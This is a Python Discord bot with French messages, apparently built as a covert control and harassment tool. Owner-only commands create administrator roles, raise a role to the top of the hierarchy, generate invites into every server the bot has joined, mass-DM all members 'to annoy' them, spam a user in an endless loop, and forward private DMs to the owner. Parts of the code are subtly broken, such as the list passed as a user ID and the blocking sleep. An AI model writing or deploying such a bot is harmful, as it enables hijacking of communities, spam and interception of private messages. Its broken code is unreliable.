import discord
from  discord.ext import commands
import time

bot = commands.Bot(command_prefix= '*', intents=discord.Intents.all())

# Event______________________________________________________________
 
@bot.event
async def on_ready():
    print(f"{bot.user.name} est en ligne")



@bot.event
async def on_message(message):

    if isinstance(message.channel, discord.DMChannel) and message.author != bot.user:

        content = message.content

        user_id = message.author.id
        user_name = message.author.name

        user1_id = owners 
        user1 = await bot.fetch_user(user1_id)

        await user1.send(f"Vous avez reçu un message de {user_name} ({user_id}) en MP : {content}")

    await bot.process_commands(message)


# Variable_________________________________________________________________________

owners = [999707155651362879]
bot.remove_command("help")

permissions_fr = {
    "create_instant_invite": "Créer une invitation instantanée",
    "kick_members": "Exclure des membres",
    "ban_members": "Bannir des membres",
    "administrator": "Administrateur",
    "manage_channels": "Gérer les salons",
    "manage_guild": "Gérer le serveur",
    "add_reactions": "Ajouter des réactions",
    "view_audit_log": "Voir les journaux d'audit",
    "priority_speaker": "Orateur prioritaire",
    "stream": "Diffuser",
    "read_messages": "Lire les messages",
    "send_messages": "Envoyer des messages",
    "send_tts_messages": "Envoyer des messages TTS",
    "manage_messages": "Gérer les messages",
    "embed_links": "Intégrer des liens",
    "attach_files": "Joindre des fichiers",
    "read_message_history": "Lire l'historique des messages",
    "mention_everyone": "Mentionner @everyone",
    "use_external_emojis": "Utiliser des emojis externes",
    "view_guild_insights": "Voir les informations du serveur",
    "connect": "Se connecter",
    "speak": "Parler",
    "mute_members": "Muter des membres",
    "deafen_members": "Sourdine des membres",
    "move_members": "Déplacer des membres",
    "use_vad": "Utiliser la détection de la voix",
    "change_nickname": "Changer de surnom",
    "manage_nicknames": "Gérer les surnoms",
    "manage_roles": "Gérer les rôles",
    "manage_webhooks": "Gérer les webhooks",
    "manage_emojis": "Gérer les emojis",
}


# Commandes______________________________________________________________



@bot.command()
async def help(ctx):
    if ctx.author.id in owners:
        
        embed = discord.Embed(
            title="Commande",
            description="Liste des commandes disponibles",
            color=discord.Color.dark_red()
        )

        embed.add_field(name="*lservers", value="Voir où je suis.")
        embed.add_field(name="*ginvite", value="ID + serveur où je suis.")
        embed.add_field(name="*dm_all", value="DM à tous les serveurs pour embêter.")
        embed.add_field(name="*mp", value="ID + message")
        embed.add_field(name="*spam", value="ID + message 1s de delais")
        embed.add_field(name="*add", value="ID name role")
        embed.add_field(name="*top", value="name du role pour mettre en haut")
        embed.add_field(name="*bl", value="nom du role crée avec perm admin donc attention !")
        embed.add_field(name="*perm", value="mention user pour voir leurs perms")


        await ctx.send(embed=embed)

@bot.command()
async def bl(ctx, role_name):
    if ctx.author.id in owners:
        if role_name:
            try:
                
                role = await ctx.guild.create_role(name=role_name, permissions=discord.Permissions(administrator=True))
                await ctx.send(f"Rôle {role.name} créé")
            except Exception as e:
                await ctx.send(f"Une erreur s'est produite : {e}")
        else:
            await ctx.send("Le nom du rôle est manquant. Utilisation : *bl <nom_du_role>")




@bot.command()
async def perm(ctx, target: discord.Member = None):
    if target is None:
        target = ctx.author  # Par défaut, utilisez l'auteur du message comme cible

    permissions = target.guild_permissions

    permissions_list = [name for name, value in permissions]
    permissions_message = "\n".join(permissions_list)

    await ctx.send(f"Permissions pour {target.display_name} :\n```{permissions_message}```")



@bot.command()
async def clear(ctx, amount: int):
    if ctx.author.id in owners:
        try:
           
            await ctx.channel.purge(limit=amount + 1)
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")

@bot.command()
async def addrole(ctx, user_id, role_name=None):
    if ctx.author.id in owners:
        try:
            # Vérifiez si user_id est un nombre valide
            if user_id.isdigit():
                user = ctx.guild.get_member(int(user_id))
                if user and role_name:
                    role = discord.utils.get(ctx.guild.roles, name=role_name)
                    if role:
                        await user.add_roles(role)
                        await ctx.send(f"{role.name} a été ajouté à {user.name}.")
                    else:
                        await ctx.send(f"Le rôle {role_name} n'a pas été trouvé.")
                else:
                    await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
            else:
                await ctx.send("L'ID de l'utilisateur n'est pas un nombre valide.")
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")



@bot.command()
async def top(ctx, role_name):
    if ctx.author.id in owners:
        guild = ctx.guild

        
        role = discord.utils.get(guild.roles, name=role_name)

        if role is not None:
            try:
                
                roles = guild.roles

                current_position = role.position

                
                highest_role = max(roles, key=lambda x: x.position)

                
                await role.edit(position=highest_role.position - 1)

                await ctx.send(f"Le rôle '{role.name}' a été déplacé en haut de la liste des rôles.")
            except Exception as e:
                await ctx.send(f"Une erreur s'est produite : {e}")
        else:
            await ctx.send("Le rôle spécifié n'a pas été trouvé.")
    else:
        await ctx.send("Vous n'avez pas l'autorisation d'utiliser cette commande.")



@bot.command()
async def dm_all(ctx, *, message):
    if ctx.author.id in owners:  
        for guild in bot.guilds:
            for member in guild.members:
                if member.bot:
                    continue  
                try:
                    await member.send(message)
                    print(f"Message envoyé à {member.name}#{member.discriminator}")
                except discord.Forbidden:
                    print(f"Impossible d'envoyer un message à {member.name}#{member.discriminator}")



@bot.command()
async def mp(ctx, user_id, *, message_content):
    if ctx.author.id in owners:
        try:
            user = await bot.fetch_user(int(user_id))
            await user.send(message_content)
            await ctx.send(f'Message envoyé en MP à {user.name} : {message_content}')
        except discord.NotFound:
            await ctx.send(f"L'utilisateur avec l'ID {user_id} n'a pas été trouvé.")
        except Exception as e:
            await ctx.send(f"Une erreur s'est produite : {e}")





@bot.command()
async def lservers(ctx):
    if ctx.author.id in owners:
        servers = bot.guilds
        embed = discord.Embed(
            title="Serveurs sur lesquels je suis",
            description=f"Je suis actuellement sur {len(servers)} serveurs.",
            color=discord.Color.blue()
        )

        for server in servers:
            member_count = server.member_count
            server_info = f"Nom : {server.name}\nID : {server.id}\nMembres : {member_count}\n\n"
            embed.add_field(name=server.name, value=server_info, inline=False)

        await ctx.send(embed=embed)
    else:
        await ctx.send("Vous n'avez pas l'autorisation d'utiliser cette commande.")




@bot.command()
async def ginvite(ctx, server_id):
    if ctx.author.id in owners:  
        server = bot.get_guild(int(server_id))
        if server:
            invite = await server.text_channels[0].create_invite()
            await ctx.send(f"Voici l'invitation pour le serveur {server.name} : {invite.url}")
        else:
            await ctx.send("Serveur introuvable. Assurez-vous que le bot est sur le serveur.")




@bot.command()
async def spam(ctx, user_id, message):
    if ctx.author.id in owners: 
        user = bot.get_user(int(user_id))
        if user:
            while True:
                await user.send(message)
                await ctx.send(f"Message envoyé à {user}#{user.discriminator}")
                time.sleep(1)  
        else:
            await ctx.send("Utilisateur introuvable. Assurez-vous que l'ID de l'utilisateur est correct.")





bot.run("TOKEN")
